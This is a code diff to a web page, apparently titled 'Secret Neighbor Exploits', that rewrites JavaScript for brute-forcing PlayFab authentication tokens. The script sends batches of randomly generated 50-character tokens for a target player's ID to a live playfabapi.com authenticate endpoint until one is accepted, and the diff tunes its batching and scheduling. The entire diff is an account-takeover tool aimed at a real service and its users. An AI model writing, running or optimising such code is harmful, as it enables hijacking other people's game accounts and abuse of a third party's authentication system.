@@ -1492,84 +1492,85 @@
       }
     }
 
-    function generateRandomToken() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      let token = '';
-      for (let i = 0; i < 50; i++) {
-        token += chars[Math.floor(Math.random() * chars.length)];
+   
+const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split(''); // Precompute character array
+const charsLength = chars.length;
+
+function generateRandomToken() {
+  const tokenLength = 50;
+  const randomBytes = crypto.getRandomValues(new Uint8Array(tokenLength));
+  return Array.from(randomBytes, byte => chars[byte % charsLength]).join('');
+}
+
+async function checkToken(username, token) {
+  try {
+    const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
+      method: 'GET',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    return { token, result: await res.json() };
+  } catch (error) {
+    return { token, error: error.message };
+  }
+}
+
+async function startBruteforce() {
+  if (bruteforceRunning) return;
+
+  const username = document.getElementById("playFabUsername").value.trim();
+  const output = document.getElementById("bruteforceOutput");
+
+  if (!username) {
+    output.textContent = "Please enter a PlayFab ID.";
+    return;
+  }
+
+  bruteforceRunning = true;
+  output.textContent = "Starting bruteforce...\n";
+
+  async function tryTokenBatch() {
+    if (!bruteforceRunning) return;
+
+    const batchSize = 5; // Minimal batch size for speed without overloading
+    const tokens = Array.from({ length: batchSize }, generateRandomToken);
+    const results = await Promise.all(tokens.map(token => checkToken(username, token)));
+
+    let foundValid = false;
+    const outputBuffer = [];
+
+    for (const { token, result, error } of results) {
+      if (error) {
+        outputBuffer.push(`Error for ${token}: ${error}`);
+      } else if (result.resultCode === 1) {
+        outputBuffer.push(`✅ Valid token found: ${token}`);
+        foundValid = true;
       }
-      return token;
     }
 
-    async function checkToken(username, token) {
-      try {
-        const res = await fetch(`https://bdff1.playfabapi.com/photon/authenticate?username=${username}&token=${token}`, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json'
-          }
-        });
-        return { token, result: await res.json() };
-      } catch (error) {
-        return { token, error: error.message };
-      }
-    }
-
-    async function startBruteforce() {
-      if (bruteforceRunning) return;
-      const username = document.getElementById("playFabUsername").value.trim();
-      const output = document.getElementById("bruteforceOutput");
-      
-      if (!username) {
-        output.textContent = "Please enter a PlayFab ID.";
-        return;
-      }
-
-      bruteforceRunning = true;
-      output.textContent = "Starting bruteforce...\n";
-
-      async function tryTokenBatch() {
-        if (!bruteforceRunning) return;
-
-        const tokens = Array.from({ length: 50 }, () => generateRandomToken());
-        
-        const results = await Promise.all(
-          tokens.map(token => checkToken(username, token))
-        );
-
-        let foundValid = false;
-        for (const { token, result, error } of results) {
-          if (error) {
-            output.textContent += `Error for ${token}: ${error}\n`;
-          } else {
-            output.textContent += `Response for ${token}: ${JSON.stringify(result)}\n`;
-            if (result.resultCode === 1) {
-              output.textContent += `✅ Valid token found: ${token}\n`;
-              foundValid = true;
-              break;
-            }
-          }
-        }
-
-        output.scrollTop = output.scrollHeight;
-
-        if (!foundValid && bruteforceRunning) {
-          setTimeout(tryTokenBatch, 0);
-        } else if (foundValid) {
-          stopBruteforce();
-        }
-      }
-
-      tryTokenBatch();
-    }
-
-    function stopBruteforce() {
-      bruteforceRunning = false;
-      const output = document.getElementById("bruteforceOutput");
-      output.textContent += "Bruteforce stopped.\n";
+    if (outputBuffer.length > 0) {
+      output.textContent += outputBuffer.join('\n') + '\n';
       output.scrollTop = output.scrollHeight;
     }
 
+    if (!foundValid && bruteforceRunning) {
+      requestAnimationFrame(tryTokenBatch); // Use requestAnimationFrame for smoother scheduling
+    } else if (foundValid) {
+      stopBruteforce();
+    }
+  }
+
+  tryTokenBatch().catch(error => {
+    output.textContent += `Batch error: ${error.message}\n`;
+    stopBruteforce();
+  });
+}
+
+function stopBruteforce() {
+  bruteforceRunning = false;
+  const output = document.getElementById("bruteforceOutput");
+  output.textContent += "Bruteforce stopped.\n";
+  output.scrollTop = output.scrollHeight;
+}
     document.addEventListener("DOMContentLoaded", function() {
       console.log("Secret Neighbor Exploits page loaded");
       const savedTicket = localStorage.getItem('sessionTicket');
